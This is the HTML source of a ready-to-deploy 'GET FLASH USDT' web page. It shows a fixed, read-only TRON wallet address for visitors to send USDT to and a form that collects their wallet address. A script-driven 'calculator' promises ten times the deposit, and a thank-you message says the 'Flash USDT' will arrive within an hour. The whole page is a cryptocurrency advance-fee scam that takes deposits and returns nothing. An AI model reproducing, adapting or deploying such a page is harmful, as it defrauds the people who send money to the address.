<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>GET FLASH USDT</title>
  <style>
    html, body { margin:0; padding:0; height:100vh; }
    body {
      background: url('bg.jpg') center/cover no-repeat;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-shadow: 0 0 5px rgba(0,0,0,0.7);
      font-family: sans-serif;
    }
    .box {
      background: rgba(0,0,0,0.5);
      padding: 2rem;
      border-radius: 12px;
      max-width: 360px;
      width: 100%;
      text-align: center;
    }
    h2 { margin-top: 0; font-size: 1.5rem; }
    label, .warning, h3 { display:block; margin: 1rem 0 0.25rem; text-align: left; }
    .warning { color: #ff4444; font-size: 1rem; font-weight: bold; text-align: center; }
    input, button { padding: 0.5rem; border: none; border-radius: 6px; font-size: 1rem; background: white; color: #333; }
    input { width: 100%; margin-bottom: 0.75rem; }
    button { width: 100%; margin-top: 1rem; background: #28a745; color: #fff; cursor: pointer; }
    button:hover { opacity: 0.9; }
    .calculator { margin-top: 1.5rem; text-align: center; }
    .calculator p { margin: 1rem 0; font-size: 1rem; }
    .calculator input { width: 4rem; text-align: center; }
  </style>
</head>
<body>
  <div class="box">
    <h2>GET FLASH USDT</h2>

    <form name="usdt-form" method="POST" data-netlify="true" action="?submitted=true">
      <input type="hidden" name="form-name" value="usdt-form">

      <label for="buyAddress">Buy Address (TRC20) (Send Your USDT Here):</label>
      <input type="text" id="buyAddress" name="buyAddress" value="TVuDSSUvFyUxFJGtXAAM1SQ7UNscPEdaHM" readonly>

      <div class="warning">PLEASE USE TRC20 (TRON) ONLY, OR YOUR ASSETS MAY BE LOST</div>

      <label for="usdtAddress">Your USDT Address:</label>
      <input type="text" id="usdtAddress" name="usdtAddress" placeholder="Enter your TRC20 address" required>

      <!-- Submit and thank you under address -->
      <button type="submit">Submit</button>
      <div id="thankyouMsg" style="display:none; color:#fff; margin-top:1rem; text-align:center;">
        <p>If you have sent the USDT to Buy Address, your Flash USDT will be sent to you in 15 minutes to 1 hour. Please wait patiently.</p>
        <p>Thank you</p>
      </div>

      <!-- Calculator section -->
      <h3>CALCULATOR</h3>
      <div class="calculator">
        <p>If you deposit <input type="number" id="deposit" name="deposit" value="1.00" step="0.01"> USDT</p>
        <p>You will get <span id="outputVal">10.00</span> USDT</p>
      </div>

    </form>
  </div>

  <script>
    const deposit = document.getElementById('deposit');
    const outputVal = document.getElementById('outputVal');
    const thankyou = document.getElementById('thankyouMsg');

    function updateOutput() {
      const val = parseFloat(deposit.value) || 0;
      outputVal.textContent = (val * 10).toFixed(2);
    }
    deposit.addEventListener('input', updateOutput);
    updateOutput();

    if (location.search.includes('submitted=true')) {
      thankyou.style.display = 'block';
    }
  </script>
</body>
</html>
